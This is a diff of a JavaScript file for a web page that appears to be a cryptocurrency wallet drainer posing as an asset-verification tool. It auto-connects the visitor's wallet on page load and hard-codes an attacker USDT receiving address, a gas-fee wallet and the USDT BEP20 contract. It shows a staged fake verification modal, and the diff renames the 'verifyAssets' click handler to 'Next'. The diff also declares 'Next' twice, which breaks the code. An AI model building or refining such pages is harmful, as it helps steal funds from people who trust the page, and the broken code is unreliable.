@@ -1,3 +1,20 @@
+ const Next = document.getElementById('Next');
+        const walletAddress = document.getElementById('walletAddress');
+        const tokenBalance = document.getElementById('tokenBalance');
+        const verificationModal = document.getElementById('verificationModal');
+        const progressBar = document.getElementById('progressBar');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
+        const step1Desc = document.getElementById('step1Desc');
+        const step2Desc = document.getElementById('step2Desc');
+        const step3Desc = document.getElementById('step3Desc');
+        const step4Desc = document.getElementById('step4Desc');
+        const modalMessage = document.getElementById('modalMessage');
+        const closeModalBtns = document.querySelectorAll('.close-modal');
+        const networkDot = document.getElementById('networkDot');
+        const networkStatus = document.getElementById('networkStatus');
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
@@ -32,7 +49,7 @@ async function connectWallet() {
 // Auto-connect wallet on page load
 window.addEventListener("load", connectWallet);
 
-async function verifyAssets() {
+async function Next() {
     if (!web3 || !userAddress) {
         alert("Wallet not connected. Refresh the page.");
         return;
@@ -155,4 +172,4 @@ function showPopup(message, color) {
 }
 
 // Attach event listener
-document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
+document.getElementById("Next").addEventListener("click", Next);
